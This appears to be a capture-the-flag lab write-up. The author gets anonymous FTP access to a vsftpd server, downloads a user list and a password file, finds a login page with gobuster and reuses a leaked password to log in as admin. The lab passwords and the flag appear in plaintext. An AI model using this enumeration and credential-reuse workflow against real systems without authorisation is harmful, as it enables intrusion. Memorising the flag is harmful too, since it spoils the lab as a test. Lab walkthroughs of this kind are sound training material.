From our scan we see two things: 
- 21 FTP - `vsftpd 3.0.3`
- 80 HTTP - `Apache httpd 2.4.41`

Its hosting a web page for some kind of digital business growth service

Lets try and connect to port 21 with anonymous credentials

```php
ftp 10.129.1.15 21

Connected to 10.129.1.15.
220 (vsFTPd 3.0.3)
Name (10.129.1.15:drew): anonymous
230 Login successful.
```

Lets see what we got in here

```php
dir
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
```

We got two files, lets download them and see what kind of secrets they hold.

```php
get allowed.userlist
allowed.userlist.passwd
```

In `allowed.userlist` we see a user called `admin`, big boss
We also got some passwords in `allowed.userlist.passwd` could come in handy later
Lets try to enumerate the sites directory with `gobuster`, we know Apache is running so its run `gobuster` specifically looking for `.php` files. 

```php
gobuster dir -u http://10.129.1.15 -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php --no-error -o gobuster.txt
```

Wow it did its job pretty fast and found what i needed before the scan was even 1% completed

```php
/.php                 (Status: 403) [Size: 276]
/login.php            (Status: 200) [Size: 1577]
/assets               (Status: 301) [Size: 311] [--> http://10.129.1.15/assets/]
/css                  (Status: 301) [Size: 308] [--> http://10.129.1.15/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.129.1.15/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 310] [--> http://10.129.1.15/fonts/]
/dashboard            (Status: 301) [Size: 314] [--> http://10.129.1.15/dashboard/]
/.php                 (Status: 403) [Size: 276]
```

We were on the lookout for something like `/login.php` 
Here We've got a form to login, lets use those passwords we found earlier for the admin user and see if we can get in.

```php
http://10.129.1.15/login.php
```

Here's the list of passwords we found earlier

```php
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

I could have used something like to do a password spray but its not worth it since there was only 4 passwords to try.
It was the last password `rKXM59ESxesUFHAd`, who would have figured 0-0
Upon logging in we have access to a dashboard and we see our flag displayed.

```php
c7110277ac44d78b6a9fff2232434d16
```
